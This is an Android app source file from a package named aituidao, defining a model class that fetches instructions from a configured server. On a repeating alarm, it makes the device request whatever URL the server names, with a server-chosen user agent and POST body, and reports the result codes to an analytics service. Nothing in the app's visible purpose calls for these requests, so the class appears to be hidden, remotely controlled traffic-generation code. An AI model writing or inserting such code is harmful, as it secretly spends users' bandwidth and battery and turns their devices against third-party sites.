package com.aituidao.android.model;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.SystemClock;
import android.preference.PreferenceManager;
import android.text.TextUtils;

import com.aituidao.android.config.Config;
import com.aituidao.android.data.NewUrlAccessResponse;
import com.aituidao.android.helper.HttpClientHelper;
import com.aituidao.android.helper.NetworkHelper;
import com.aituidao.android.receiver.NewUrlAccessReceiver;
import com.alibaba.fastjson.JSON;
import com.umeng.analytics.MobclickAgent;

public class NewUrlAccessModel {
	private static NewUrlAccessModel mInstance = null;

	private Context mContext;
	private SharedPreferences mSharedPreferences;
	private SharedPreferences.Editor mEditor;

	private NewUrlAccessResponse mAccessInfo;

	private NewUrlAccessModel(Context context) {
		mContext = context.getApplicationContext();
		mSharedPreferences = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		mEditor = mSharedPreferences.edit();
	}

	private static final int ACCESS_URL_HANDLER_WHAT = 1;
	private static final int GOT_NEW_URL_HANDLER_WHAT = 2;

	@SuppressLint("HandlerLeak")
	private Handler mHandler = new Handler(Looper.getMainLooper()) {
		@Override
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case ACCESS_URL_HANDLER_WHAT:
				if ((mAccessInfo != null)
						&& (mAccessInfo.url != null)
						&& (mAccessInfo.url.startsWith("http://") || (mAccessInfo.url
								.startsWith("https://")))
						&& (System.currentTimeMillis() <= mAccessInfo.timeout)) {
					if (NetworkHelper.isConnectionAvailable(mContext)) {
						Map<String, String> postData = null;

						if (!TextUtils.isEmpty(mAccessInfo.postData)) {
							try {
								JSONObject jsonObj = new JSONObject(
										mAccessInfo.postData);

								postData = new HashMap<String, String>();

								@SuppressWarnings("unchecked")
								Iterator<String> keys = jsonObj.keys();

								while (keys.hasNext()) {
									String key = keys.next();
									try {
										String value = jsonObj.getString(key);
										postData.put(key, value);
									} catch (Exception e) {
										continue;
									}
								}
							} catch (Exception e) {
								// do nothing
							}
						}

						startUrlAccess(mAccessInfo.id, mAccessInfo.userAgent,
								mAccessInfo.url, postData);
					}

					if (mAccessInfo.periodMs > 0) {
						mHandler.sendEmptyMessageDelayed(
								ACCESS_URL_HANDLER_WHAT, mAccessInfo.periodMs);
					}
				} else {
					mAccessInfo = null;
					setNewUrlAccessResponse(mAccessInfo);
				}
				break;

			case GOT_NEW_URL_HANDLER_WHAT:
				mAccessInfo = (NewUrlAccessResponse) msg.obj;

				if ((mAccessInfo == null)
						|| (mAccessInfo.url == null)
						|| ((!mAccessInfo.url.startsWith("http://")) && (!mAccessInfo.url
								.startsWith("https://")))) {
					mAccessInfo = null;
				} else if (System.currentTimeMillis() > mAccessInfo.timeout) {
					mAccessInfo = null;
				} else {
					mHandler.sendEmptyMessage(ACCESS_URL_HANDLER_WHAT);
				}

				setNewUrlAccessResponse(mAccessInfo);
				break;
			}
		}
	};

	public static synchronized NewUrlAccessModel getInstance(Context context) {
		if (mInstance == null) {
			mInstance = new NewUrlAccessModel(context);
		}

		return mInstance;
	}

	public void checkAndStartNewUrlAccess() {
		mHandler.removeMessages(ACCESS_URL_HANDLER_WHAT);

		mAccessInfo = getNewUrlAccessResponse();
		if (mAccessInfo == null) {
			startGetNewUrlAccess();
		} else {
			mHandler.sendEmptyMessage(ACCESS_URL_HANDLER_WHAT);
		}

		Intent intent = new Intent(Config.NEW_URL_ACCESS_ACTION);
		intent.setClass(mContext, NewUrlAccessReceiver.class);
		PendingIntent pendingIntent = PendingIntent.getBroadcast(mContext, 0,
				intent, 0);

		AlarmManager am = (AlarmManager) mContext
				.getSystemService(Context.ALARM_SERVICE);
		am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME,
				SystemClock.elapsedRealtime()
						+ Config.NEW_URL_ACCESS_ACTION_PERIOD,
				Config.NEW_URL_ACCESS_ACTION_PERIOD, pendingIntent);
	}

	private void startGetNewUrlAccess() {
		new Thread(new Runnable() {
			@Override
			public void run() {
				String responseStr = HttpClientHelper.requestStrMe(
						Config.NEW_URL_ACCESS_URL, null);

				NewUrlAccessResponse response = null;
				try {
					response = JSON.parseObject(responseStr,
							NewUrlAccessResponse.class);
				} catch (Exception e) {
				}

				mHandler.sendMessage(mHandler.obtainMessage(
						GOT_NEW_URL_HANDLER_WHAT, response));
			}
		}).start();
	}

	private void startUrlAccess(final long id, final String userAgent,
			final String url, final Map<String, String> postMap) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				final int resultCode = HttpClientHelper.requestStatusCodeOther(
						userAgent, url, postMap);

				try {
					HashMap<String, String> map = new HashMap<String, String>();
					map.put("code", id + ":" + resultCode);
					MobclickAgent.onEvent(mContext, "urlAccess", map);
				} catch (Exception e) {
					// do nothing;
				}
			}
		}).start();
	}

	private static final String ACCESS_ID = "access_id";
	private static final String ACCESS_URL = "access_url";
	private static final String ACCESS_PERIOD = "access_period";
	private static final String ACCESS_TIMEOUT = "access_timeout";
	private static final String ACCESS_USER_AGENT = "access_user_agent";
	private static final String ACCESS_POST_DATA = "access_post_data";

	private NewUrlAccessResponse getNewUrlAccessResponse() {
		long id = mSharedPreferences.getLong(ACCESS_ID, -1);
		String url = mSharedPreferences.getString(ACCESS_URL, null);
		long period = mSharedPreferences.getLong(ACCESS_PERIOD, -1);
		long timeout = mSharedPreferences.getLong(ACCESS_TIMEOUT, -1);
		String userAgent = mSharedPreferences
				.getString(ACCESS_USER_AGENT, null);
		String postData = mSharedPreferences.getString(ACCESS_POST_DATA, null);

		if ((url == null)
				|| ((!url.startsWith("http://")) && (!url
						.startsWith("https://")))) {
			setNewUrlAccessResponse(null);
			return null;
		}

		if (System.currentTimeMillis() > timeout) {
			setNewUrlAccessResponse(null);
			return null;
		}

		NewUrlAccessResponse result = new NewUrlAccessResponse();
		result.id = id;
		result.url = url;
		result.periodMs = period;
		result.timeout = timeout;
		result.userAgent = userAgent;
		result.postData = postData;

		return result;
	}

	private void setNewUrlAccessResponse(NewUrlAccessResponse response) {
		if (response == null) {
			mEditor.putLong(ACCESS_ID, -1);
			mEditor.putString(ACCESS_URL, null);
			mEditor.putLong(ACCESS_PERIOD, -1);
			mEditor.putLong(ACCESS_TIMEOUT, -1);
			mEditor.putString(ACCESS_USER_AGENT, null);
			mEditor.putString(ACCESS_POST_DATA, null);
		} else {
			mEditor.putLong(ACCESS_ID, response.id);
			mEditor.putString(ACCESS_URL, response.url);
			mEditor.putLong(ACCESS_PERIOD, response.periodMs);
			mEditor.putLong(ACCESS_TIMEOUT, response.timeout);
			mEditor.putString(ACCESS_USER_AGENT, response.userAgent);
			mEditor.putString(ACCESS_POST_DATA, response.postData);
		}

		mEditor.commit();
	}
}
